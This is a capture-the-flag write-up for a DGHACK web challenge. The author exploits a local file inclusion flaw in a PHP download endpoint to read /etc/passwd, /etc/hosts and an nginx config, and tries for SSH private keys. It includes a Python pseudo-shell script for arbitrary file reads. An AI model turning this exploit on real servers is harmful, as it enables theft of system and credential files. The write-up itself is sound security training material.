# Web / Un chasseur - partie 1 - 

## Challenge
Des analystes SOC du Ministère des Armées ont remarqué des flux suspects provenant de machines internes vers un site vitrine d'une entreprise. Pourtant ce site semble tout à fait légitime.

Vous avez été mandaté par la Direction Générale de l'Armement pour mener l'enquête. Trouvez un moyen de reprendre partiellement le contrôle du site web afin de trouver comment ce serveur joue un rôle dans l'infrastructure de l'acteur malveillant.

Aucun fuzzing n'est nécessaire.

Le flag se trouve sur le serveur à l'endroit permettant d'en savoir plus sur l'infrastructure de l'attaquant.

## Inputs
- http://unchasseursachantchasser.chall.malicecyber.com/

## Solution
With `BURP` open, clicking on every page, I see  some php file `burger.php` calling another one `download.php` to retrieve some images:
```
href="download.php?menu=menu_updated_09_11_2022.jpg
```

Let's try to use it to download a file on the server like `/etc/passwd`: http://unchasseursachantchasser.chall.malicecyber.com/download.php?menu=/etc/passwd

It works, we get the file !
```console
$ cat  ~/Downloads/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
challenge:x:1337:1337::/home/challenge:/bin/sh
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
Debian-exim:x:102:102::/var/spool/exim4:/usr/sbin/nologin
```

Let's script this to make our life easier. Following piece of code gives us a pseudo-terminal where we can issue commands to `cat` files. Listing directories doesn't seem allowed on the server though...
```python
import requests
from cmd import Cmd

class Terminal(Cmd):
    prompt = '> '

    def __init__(self):
        super().__init__()

    def do_cat(self, args):
        print(run_php(f'{args}'))


def run_php(php_code):
    url = 'http://unchasseursachantchasser.chall.malicecyber.com/download.php'
    params = { 'menu': str.encode(php_code) }
    #proxy = { 'http': 'http://localhost:8080' }
    r = requests.get(url, params=params)
    return(r.content.decode('utf-8'))

term = Terminal()
term.cmdloop()
```

Here it is in action. Sweet.

```console
$ python3 sol.py
> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
challenge:x:1337:1337::/home/challenge:/bin/sh
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
Debian-exim:x:102:102::/var/spool/exim4:/usr/sbin/nologin

> cat /home/nobody/.bash_history
File does not exist.
> cat /home/nobody/.ssh/id_rsa
File does not exist.
> cat /root/.ssh/id_rsa
File does not exist.
>
```

Let's poke interesting files now. A nice list from Daniel Miessler `SecLists` is available at https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt.

But let's be more specific. After all it is indicated that the flag is located where we can learn about the attacker's infra.

```console
> cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
 127.0.0.1      covenant-attacker.com
172.20.0.2      UnChasseurSachantChasser
>
> cat /etc/nginx/nginx.conf
(...)
        # DGHACK{L3s_D0ux_Burg3r5_se_s0nt_f4it_pwn_:(}
        location ^~ /1d8b4cf854cd42f4868849c4ce329da72c406cc11983b4bf45acdae0805f7a72 {
            limit_except GET POST PUT { deny all; }
            rewrite /1d8b4cf854cd42f4868849c4ce329da72c406cc11983b4bf45acdae0805f7a72/(.*) /$1  break;
            proxy_pass https://covenant-attacker.com:7443;
        }
    }
}
>
```

Got the flag in the `nginx` config !

## Python code
Code for the pseudo-shell: [sol.py](./sol.py)

## Flag
DGHACK{L3s_D0ux_Burg3r5_se_s0nt_f4it_pwn_:(}
